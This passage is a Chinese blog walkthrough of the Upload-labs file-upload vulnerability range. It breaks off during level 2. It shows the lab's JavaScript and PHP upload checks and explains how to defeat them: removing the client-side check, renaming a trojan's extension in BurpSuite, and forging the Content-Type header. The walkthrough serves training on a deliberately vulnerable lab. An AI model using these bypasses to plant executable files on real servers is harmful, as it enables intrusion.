

<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <link rel="preconnect" href="http://font.wutongliran.top/" crossorigin />
    <link href="http://font.wutongliran.top/result.css" rel="stylesheet" />

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noodp" />
    <title>Upload-labs靶场实战 - 梧桐漓染的博客</title><meta name="Description" content="桐漓的博客"><meta property="og:title" content="Upload-labs靶场实战" />
<meta property="og:description" content="Upload-labs靶场实战 方法不唯一 第一关(前端验证) 相关源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function checkFile() { var file = document.getElementsByName(&#39;upload_file&#39;)[0].value; if (file == null || file == &#34;&#34;) { aler" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/upload-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" /><meta property="og:image" content="/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-08T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-08-08T00:00:00+00:00" /><meta property="og:site_name" content="Lyrio&#39;s blog" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="/logo.png"/>

<meta name="twitter:title" content="Upload-labs靶场实战"/>
<meta name="twitter:description" content="Upload-labs靶场实战 方法不唯一 第一关(前端验证) 相关源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function checkFile() { var file = document.getElementsByName(&#39;upload_file&#39;)[0].value; if (file == null || file == &#34;&#34;) { aler"/>
<meta name="application-name" content="Lyrio&#39;s blog">
<meta name="apple-mobile-web-app-title" content="Lyrio&#39;s blog">

<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/upload-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" /><link rel="prev" href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="/ssrf%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript>
    
    
    
    <script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Upload-labs靶场实战",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "\/upload-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98\/"
        },"genre": "posts","keywords": "文件上传漏洞","wordcount":  8102 ,
        "url": "\/upload-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98\/","datePublished": "2023-08-08T00:00:00+00:00","dateModified": "2023-08-08T00:00:00+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "Lyrio"
            },"description": ""
    }
    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
</head>

<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme; }
        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('light' === 'light' || 'light' === 'dark' || 'light' === 'black') setTheme('light'), saveTheme('light'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
    </script>
    <div id="back-to-top"></div>
    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="梧桐漓染的博客"><img
        class="logo"
        loading="lazy"
        src="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
        srcset="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 1.5x, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 2x"
        sizes="auto"
        alt="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
        title="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png" ></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fa fa-book'></i> 文章 </a><a class="menu-item" href="/categories/"><i class='fa fa-tasks'></i> 分类 </a><a class="menu-item" href="/tags/"><i class='fa fa-bookmark'></i> 标签 </a><a class="menu-item" href="/friends/"><i class='fas fa-fw fa-fan fa-spin'></i> 友链 </a><a class="menu-item" href="/about/"><i class='fas fa-spinner fa-pulse'></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="#" class="menu-item theme-select" title="切换主题">
                    <i class="fas fa-adjust fa-fw"></i>
                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
                        <option value="light">浅色</option>
                        <option value="dark">深色</option>
                        <option value="black">黑色</option>
                        <option value="auto">跟随系统</option>
                    </select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="梧桐漓染的博客"><img
        class="logo"
        loading="lazy"
        src="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
        srcset="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 1.5x, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 2x"
        sizes="auto"
        alt="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
        title="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png" ></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="#" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title=""><i class='fa fa-book'></i>文章</a><a class="menu-item" href="/categories/" title=""><i class='fa fa-tasks'></i>分类</a><a class="menu-item" href="/tags/" title=""><i class='fa fa-bookmark'></i>标签</a><a class="menu-item" href="/friends/" title=""><i class='fas fa-fw fa-fan fa-spin'></i>友链</a><a class="menu-item" href="/about/" title=""><i class='fas fa-spinner fa-pulse'></i>关于</a><a href="#" class="menu-item theme-select" title="切换主题">
                <i class="fas fa-adjust fa-fw"></i>
                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
                    <option value="light">浅色</option>
                    <option value="dark">深色</option>
                    <option value="black">黑色</option>
                    <option value="auto">跟随系统</option>
                </select>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
            <div class="container"><div class="toc" id="toc-auto">
        <h2 class="toc-title">目录</h2>
        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
  <ul>
    <li><a href="#第一关前端验证">第一关(前端验证)</a>
      <ul>
        <li><a href="#相关源码">相关源码</a></li>
        <li><a href="#绕过方法">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第二关mime验证">第二关(MIME验证)</a>
      <ul>
        <li><a href="#相关源码-1">相关源码</a></li>
        <li><a href="#绕过方法-1">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第三关等价拓展名">第三关(等价拓展名)</a>
      <ul>
        <li><a href="#相关源码-2">相关源码</a></li>
        <li><a href="#绕过方法-2">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第四关htaccess">第四关(.htaccess)</a>
      <ul>
        <li><a href="#相关源码-3">相关源码</a></li>
        <li><a href="#绕过方法-3">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第五关userini">第五关(.user.ini)</a>
      <ul>
        <li><a href="#相关源码-4">相关源码</a></li>
        <li><a href="#绕过方法-4">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第六关大小写绕过">第六关(大小写绕过)</a>
      <ul>
        <li><a href="#相关源码-5">相关源码</a></li>
        <li><a href="#绕过方法-5">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第七关空格绕过">第七关(空格绕过)</a>
      <ul>
        <li><a href="#相关源码-6">相关源码</a></li>
        <li><a href="#绕过方法-6">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第八关号绕过">第八关(.号绕过)</a>
      <ul>
        <li><a href="#相关源码-7">相关源码</a></li>
        <li><a href="#绕过方法-7">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第九关data绕过">第九关(::$DATA绕过)</a>
      <ul>
        <li><a href="#相关源码-8">相关源码</a></li>
        <li><a href="#绕过方法-8">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十关拼接绕过">第十关(拼接绕过)</a>
      <ul>
        <li><a href="#相关源码-9">相关源码</a></li>
        <li><a href="#绕过方法-9">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十一关双写绕过">第十一关(双写绕过)</a>
      <ul>
        <li><a href="#相关源码-10">相关源码</a></li>
        <li><a href="#绕过方法-10">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十二关get型截断绕过">第十二关(GET型截断绕过)</a>
      <ul>
        <li><a href="#相关源码-11">相关源码</a></li>
        <li><a href="#绕过方法-11">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十三关post型截断绕过">第十三关(POST型截断绕过)</a>
      <ul>
        <li><a href="#相关源码-12">相关源码</a></li>
        <li><a href="#绕过方法-12">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十四关图片马过unpack">第十四关(图片马过unpack())</a>
      <ul>
        <li><a href="#相关源码-13">相关源码</a></li>
        <li><a href="#绕过方法-13">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十五关图片马过getimagesize">第十五关(图片马过getimagesize())</a>
      <ul>
        <li><a href="#相关源码-14">相关源码</a></li>
        <li><a href="#绕过方法-14">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十六关图片马过exif_imagetype">第十六关(图片马过exif_imagetype())</a>
      <ul>
        <li><a href="#相关源码-15">相关源码</a></li>
        <li><a href="#绕过方法-15">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十七关二次渲染绕过">第十七关(二次渲染绕过)</a>
      <ul>
        <li><a href="#相关源码-16">相关源码</a></li>
        <li><a href="#绕过方法-16">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十八关条件竞争">第十八关(条件竞争)</a>
      <ul>
        <li><a href="#相关源码-17">相关源码</a></li>
        <li><a href="#绕过方法-17">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十九关apache解析漏洞">第十九关(Apache解析漏洞)</a>
      <ul>
        <li><a href="#相关源码-18">相关源码</a></li>
        <li><a href="#绕过方法-18">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第二十关绕move_uploaded_file">第二十关(/.绕move_uploaded_file())</a>
      <ul>
        <li><a href="#相关源码-19">相关源码</a></li>
        <li><a href="#绕过方法-19">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第二十一关">第二十一关</a>
      <ul>
        <li><a href="#相关源码-20">相关源码</a></li>
        <li><a href="#绕过方法-20">绕过方法</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#执行权限">执行权限</a></li>
    <li><a href="#解码还原">解码还原</a></li>
    <li><a href="#分站存储">分站存储</a></li>
    <li><a href="#oss对象">OSS对象</a></li>
  </ul>
</nav></div>
    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Upload-labs靶场实战</h1><div class="post-meta">
            <div class="post-meta-line">
                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Lyrio</a>
                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/web%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw"></i>Web安全</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-08-08">2023-08-08</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-08-08">2023-08-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 8102 字&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 17 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#第一关前端验证">第一关(前端验证)</a>
      <ul>
        <li><a href="#相关源码">相关源码</a></li>
        <li><a href="#绕过方法">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第二关mime验证">第二关(MIME验证)</a>
      <ul>
        <li><a href="#相关源码-1">相关源码</a></li>
        <li><a href="#绕过方法-1">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第三关等价拓展名">第三关(等价拓展名)</a>
      <ul>
        <li><a href="#相关源码-2">相关源码</a></li>
        <li><a href="#绕过方法-2">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第四关htaccess">第四关(.htaccess)</a>
      <ul>
        <li><a href="#相关源码-3">相关源码</a></li>
        <li><a href="#绕过方法-3">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第五关userini">第五关(.user.ini)</a>
      <ul>
        <li><a href="#相关源码-4">相关源码</a></li>
        <li><a href="#绕过方法-4">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第六关大小写绕过">第六关(大小写绕过)</a>
      <ul>
        <li><a href="#相关源码-5">相关源码</a></li>
        <li><a href="#绕过方法-5">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第七关空格绕过">第七关(空格绕过)</a>
      <ul>
        <li><a href="#相关源码-6">相关源码</a></li>
        <li><a href="#绕过方法-6">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第八关号绕过">第八关(.号绕过)</a>
      <ul>
        <li><a href="#相关源码-7">相关源码</a></li>
        <li><a href="#绕过方法-7">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第九关data绕过">第九关(::$DATA绕过)</a>
      <ul>
        <li><a href="#相关源码-8">相关源码</a></li>
        <li><a href="#绕过方法-8">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十关拼接绕过">第十关(拼接绕过)</a>
      <ul>
        <li><a href="#相关源码-9">相关源码</a></li>
        <li><a href="#绕过方法-9">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十一关双写绕过">第十一关(双写绕过)</a>
      <ul>
        <li><a href="#相关源码-10">相关源码</a></li>
        <li><a href="#绕过方法-10">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十二关get型截断绕过">第十二关(GET型截断绕过)</a>
      <ul>
        <li><a href="#相关源码-11">相关源码</a></li>
        <li><a href="#绕过方法-11">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十三关post型截断绕过">第十三关(POST型截断绕过)</a>
      <ul>
        <li><a href="#相关源码-12">相关源码</a></li>
        <li><a href="#绕过方法-12">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十四关图片马过unpack">第十四关(图片马过unpack())</a>
      <ul>
        <li><a href="#相关源码-13">相关源码</a></li>
        <li><a href="#绕过方法-13">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十五关图片马过getimagesize">第十五关(图片马过getimagesize())</a>
      <ul>
        <li><a href="#相关源码-14">相关源码</a></li>
        <li><a href="#绕过方法-14">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十六关图片马过exif_imagetype">第十六关(图片马过exif_imagetype())</a>
      <ul>
        <li><a href="#相关源码-15">相关源码</a></li>
        <li><a href="#绕过方法-15">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十七关二次渲染绕过">第十七关(二次渲染绕过)</a>
      <ul>
        <li><a href="#相关源码-16">相关源码</a></li>
        <li><a href="#绕过方法-16">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十八关条件竞争">第十八关(条件竞争)</a>
      <ul>
        <li><a href="#相关源码-17">相关源码</a></li>
        <li><a href="#绕过方法-17">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第十九关apache解析漏洞">第十九关(Apache解析漏洞)</a>
      <ul>
        <li><a href="#相关源码-18">相关源码</a></li>
        <li><a href="#绕过方法-18">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第二十关绕move_uploaded_file">第二十关(/.绕move_uploaded_file())</a>
      <ul>
        <li><a href="#相关源码-19">相关源码</a></li>
        <li><a href="#绕过方法-19">绕过方法</a></li>
      </ul>
    </li>
    <li><a href="#第二十一关">第二十一关</a>
      <ul>
        <li><a href="#相关源码-20">相关源码</a></li>
        <li><a href="#绕过方法-20">绕过方法</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#执行权限">执行权限</a></li>
    <li><a href="#解码还原">解码还原</a></li>
    <li><a href="#分站存储">分站存储</a></li>
    <li><a href="#oss对象">OSS对象</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="upload-labs靶场实战" class="headerLink">
    <a href="#upload-labs%e9%9d%b6%e5%9c%ba%e5%ae%9e%e6%88%98" class="header-mark"></a>Upload-labs靶场实战</h1><blockquote>
<p>方法不唯一</p>
</blockquote>
<h2 id="第一关前端验证" class="headerLink">
    <a href="#%e7%ac%ac%e4%b8%80%e5%85%b3%e5%89%8d%e7%ab%af%e9%aa%8c%e8%af%81" class="header-mark"></a>第一关(前端验证)</h2><h3 id="相关源码" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">checkFile</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">file</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByName</span><span class="p">(</span><span class="s1">&#39;upload_file&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="nx">file</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;请选择要上传的文件!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//定义允许上传的文件类型
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">var</span> <span class="nx">allow_ext</span> <span class="o">=</span> <span class="s2">&#34;.jpg|.png|.gif&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//提取上传文件的类型
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">var</span> <span class="nx">ext_name</span> <span class="o">=</span> <span class="nx">file</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">file</span><span class="p">.</span><span class="nx">lastIndexOf</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//判断上传文件类型是否允许上传
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">allow_ext</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">ext_name</span> <span class="o">+</span> <span class="s2">&#34;|&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">errMsg</span> <span class="o">=</span> <span class="s2">&#34;该文件不允许上传，请上传&#34;</span> <span class="o">+</span> <span class="nx">allow_ext</span> <span class="o">+</span> <span class="s2">&#34;类型的文件,当前文件类型为：&#34;</span> <span class="o">+</span> <span class="nx">ext_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">alert</span><span class="p">(</span><span class="nx">errMsg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95" class="header-mark"></a>绕过方法</h3><p>方法一：删除文件提交时触发的检测函数
<img src="https://pic.imgdb.cn/item/64c9d5f31ddac507cc9aa1d9.jpg" style="zoom:67%;" /></p>
<p>方法二：先将木马改成<code>.jpg</code>，开启BurpSuite抓包，上传文件，将抓到的请求包里的文件后缀名改成<code>.php</code>
<img src="https://pic.imgdb.cn/item/64c9d9371ddac507cca13fc4.jpg" style="zoom:67%;" /></p>
<p>​</p>
<h2 id="第二关mime验证" class="headerLink">
    <a href="#%e7%ac%ac%e4%ba%8c%e5%85%b3mime%e9%aa%8c%e8%af%81" class="header-mark"></a>第二关(MIME验证)</h2><h3 id="相关源码-1" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-1" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">((</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;image/png&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;image/gif&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]</span>            
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;文件类型不正确，请重新上传！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;文件夹不存在,请手工创建！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-1" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-1" class="header-mark"></a>绕过方法</h3><p>开启抓包，上传文件，将<code>Content-Type: application/octet-stream</code>改成<code>Content-Type:image/jpeg </code>
<img src="https://pic.imgdb.cn/item/64c9e5391ddac507ccbc5827.jpg" style="zoom:67%;" /></p>
<p>Content-Type：</p>
<ul>
<li><code>image/jpeg</code>  ：jpg 图片格式</li>
<li><code>image/png</code>    ：png 图片格式</li>
<li><code>image/gif</code>    ：gif 图片格式</li>
<li><code>text/plain </code> ：纯文本格式</li>
